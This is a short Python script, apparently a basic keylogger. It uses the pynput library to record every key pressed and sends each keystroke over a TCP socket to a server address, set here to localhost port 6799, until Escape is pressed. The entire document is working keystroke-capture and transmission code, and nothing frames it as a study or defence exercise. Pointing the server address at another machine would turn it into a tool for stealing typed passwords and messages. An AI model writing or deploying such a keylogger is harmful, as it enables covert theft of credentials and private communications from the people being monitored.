from pynput.keyboard import Listener, Key
import socket

def send_keystrokes():
    # Server address and port
    server_address = ('localhost', 6799)
    # Create a socket object using TCP/IP protocol
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect to the server
    client_socket.connect(server_address)
    
    def on_press(key):
        try:
            # Convert the key to string and encode it to bytes, then send it
            key_data = str(key.char)
        except AttributeError:
            # Special keys (like space, ctrl, etc.) are handled here
            key_data = str(key)
        
        print(f'Sending: {key_data}')
        client_socket.sendall(key_data.encode())

    def on_release(key):
        # Stop listener with the escape key
        if key == Key.esc:
            client_socket.close()  # Close the socket connection
            return False  # Stop the listener
    
    # Start listening to keyboard input
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == '__main__':
    send_keystrokes()
